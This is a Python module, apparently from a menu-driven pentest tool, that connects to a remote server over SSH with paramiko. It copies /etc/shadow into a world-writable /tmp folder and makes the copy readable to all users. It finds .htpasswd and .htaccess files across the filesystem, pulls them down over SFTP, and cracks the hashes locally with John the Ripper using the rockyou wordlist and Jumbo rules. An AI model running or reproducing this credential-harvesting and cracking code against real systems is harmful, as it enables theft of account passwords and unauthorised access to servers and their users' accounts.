import paramiko
import os
import subprocess
import shutil

# Function to check if John The Ripper is installed
def is_john_installed():
    """Checks if John The Ripper is installed on the system."""
    return shutil.which("john") is not None

# Function to install John The Ripper
def install_john():
    """Installs John The Ripper from source and configures it for global usage."""
    print("[John] Installing John The Ripper...")

    commands = [
        "sudo apt update && sudo apt install -y build-essential libssl-dev",
        "git clone https://github.com/openwall/john.git && cd john/src",
        "./configure && make -sj$(nproc)",
        "cd ../run && sudo ln -s $(pwd)/john /usr/local/bin/john",  # Create a global symlink
        "echo \"alias john='$(pwd)/john'\" >> ~/.bashrc && source ~/.bashrc"  # Set alias
    ]

    try:
        for cmd in commands:
            subprocess.run(cmd, shell=True, check=True, executable="/bin/bash")

        print("[John] Installation completed successfully!")
        
        # Verify installation
        if is_john_installed():
            print("[John] John The Ripper is successfully installed and ready to use.")
        else:
            print("[John] Installation completed, but 'john' command is not found. Try running:")
            print("   source ~/.bashrc")
            print("or restart your terminal.")
        
    except subprocess.CalledProcessError as e:
        print(f"[John] Installation failed: {e}")

# Function to retrieve hash files from the server
def retrieve_hash_files(serveur):
    """Retrieves hash files from the remote server via SSH and stores them locally."""
    hash_files = []
    print("\n[John] Searching for hashed password files on the remote server...")

    # Create a temporary directory on the remote server
    temp_dir = "/tmp/hash_extract"
    serveur.exec_command(f"mkdir -p {temp_dir} && sudo chmod 777 {temp_dir}")

    # Create a readable copy of /etc/shadow
    command_shadow = f"sudo cp /etc/shadow {temp_dir}/shadow_copy && sudo chmod 644 {temp_dir}/shadow_copy"
    serveur.exec_command(command_shadow)

    # Ensure the copy exists before retrieving
    command_check = f"test -f {temp_dir}/shadow_copy && echo '{temp_dir}/shadow_copy'"
    stdin, stdout, stderr = serveur.exec_command(command_check)
    shadow_copy_result = stdout.read().decode().strip()

    if shadow_copy_result:
        hash_files.append(shadow_copy_result)

    # Find and copy .htpasswd and .htaccess files to the temp directory
    command_htpasswd = f"sudo find / -name '.htpasswd' -o -name '.htaccess' 2>/dev/null -exec cp {{}} {temp_dir}/ \\;"
    serveur.exec_command(command_htpasswd)

    # List the files in the temp directory
    stdin, stdout, stderr = serveur.exec_command(f"ls {temp_dir}")
    files_list = stdout.read().decode().strip().split("\n")

    if not files_list or files_list == [""]:
        print("[John] No hash files found on the server.")
        return

    # Store files locally in the same folder as script.py
    local_dir = os.path.dirname(os.path.abspath(__file__)) + "/hash_files/"
    os.makedirs(local_dir, exist_ok=True)

    for file in files_list:
        remote_file = f"{temp_dir}/{file}"
        local_path = os.path.join(local_dir, file)
        try:
            sftp = serveur.open_sftp()
            sftp.get(remote_file, local_path)
            print(f"[John] Retrieved: {remote_file} → {local_path}")
        except Exception as e:
            print(f"[John] Error transferring file {remote_file}: {e}")
        finally:
            sftp.close()

    # Cleanup: Remove temporary directory and its contents on the remote server
    serveur.exec_command(f"sudo rm -rf {temp_dir}")

    print("\n[John] Hash file retrieval completed.")


# Function to use John The Ripper
def use_john():
    """Runs John The Ripper locally on retrieved hash files."""
    local_dir = "./hash_files/"
    
    if not os.path.exists(local_dir) or not os.listdir(local_dir):
        print("[John] No hash files found locally. Please retrieve them first using option 4.")
        return

    print("\n===== John The Ripper Menu =====")
    print("1 - Dictionary Attack")
    print("2 - Advanced Rules Attack")
    print("3 - Install John The Ripper")
    print("4 - Return to Main Menu")

    choice = input("Select an option (1-4): ")

    if choice == "3":
        install_john()
        return

    if not is_john_installed():
        print("[John] John The Ripper is not installed. Please install it first (option 3).")
        return

    hash_files = [os.path.join(local_dir, f) for f in os.listdir(local_dir)]

    if choice == "1":
        for file in hash_files:
            run_john_dictionary(file)

    elif choice == "2":
        for file in hash_files:
            run_john_rules(file)

    elif choice == "4":
        return

    else:
        print("Invalid option, please select a valid choice.")

# Function to run John The Ripper with a dictionary attack
def run_john_dictionary(local_file):
    """Runs John The Ripper in dictionary attack mode."""
    print(f"\n[John] Attempting password cracking with dictionary for: {local_file}")

    command = [
        "john",
        "--wordlist=/usr/share/wordlists/rockyou.txt",
        "--format=auto",
        local_file
    ]

    try:
        subprocess.run(command, check=True)
        print("\n[John] Process completed. Displaying results:")
        subprocess.run(["john", "--show", local_file])
    except subprocess.CalledProcessError as e:
        print(f"[John] Error during execution: {e}")

# Function to run John The Ripper with advanced rules
def run_john_rules(local_file):
    """Runs John The Ripper with advanced password derivation rules."""
    print(f"\n[John] Attempting password cracking with advanced rules for: {local_file}")

    command = [
        "john",
        "--wordlist=/usr/share/wordlists/rockyou.txt",
        "--rules=Jumbo",
        "--format=auto",
        local_file
    ]

    try:
        subprocess.run(command, check=True)
        print("\n[John] Process completed. Displaying results:")
        subprocess.run(["john", "--show", local_file])
    except subprocess.CalledProcessError as e:
        print(f"[John] Error during execution: {e}")
